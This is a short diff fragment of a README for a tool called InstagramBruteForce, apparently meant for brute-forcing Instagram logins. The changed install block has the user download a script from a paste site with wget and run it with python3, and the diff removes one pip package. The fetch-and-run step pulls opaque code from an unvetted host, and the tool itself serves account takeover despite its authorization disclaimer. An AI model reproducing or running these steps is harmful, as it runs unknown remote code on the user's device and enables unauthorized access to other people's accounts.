@@ -72,7 +72,7 @@ It is recommended to use <b>InstagramBruteForce</b> only with explicit authoriza
   ```
   >> cd /sdcard/Download
   >> mkdir Premium && cd Premium
-  >> pip3 install requests rich futures
+  >> pip3 install requests futures
   >> wget https://sharetext.me/raw/f8sbry9oiz -O Prem.py
   >> python3 Prem.py
   ```
